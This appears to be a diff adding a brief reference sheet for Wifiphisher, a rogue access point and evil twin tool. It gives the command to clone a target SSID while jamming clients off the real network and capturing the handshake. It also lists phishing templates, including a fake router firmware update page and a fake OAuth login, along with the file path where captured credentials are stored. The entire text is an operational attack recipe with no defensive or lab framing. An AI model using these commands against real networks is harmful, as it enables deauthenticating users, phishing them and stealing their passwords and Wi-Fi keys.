@@ -1,0 +1,21 @@
+# Wifiphisher — Rogue AP / Evil Twin Reference
+# Requires: 2 wireless interfaces (or 1 with --nojamming)
+
+## Launch with target SSID
+wifiphisher -aI wlan0 -jI wlan1 -e "Target_SSID" --handshake-capture handshake.pcap
+
+## Phishing page scenarios
+# firmware-upgrade  — fake router firmware update page (captures creds)
+# oauth-login       — fake OAuth/social login
+# plugin_update     — browser plugin update phish
+wifiphisher --phishing-pages   # list available templates
+
+## Key flags
+# -aI  Access point interface
+# -jI  Jamming interface
+# -e   Target ESSID
+# -p   Phishing scenario name
+# --nojamming  No deauth (single interface mode)
+
+## Credential capture location
+# /tmp/wifiphisher-credentials.txt
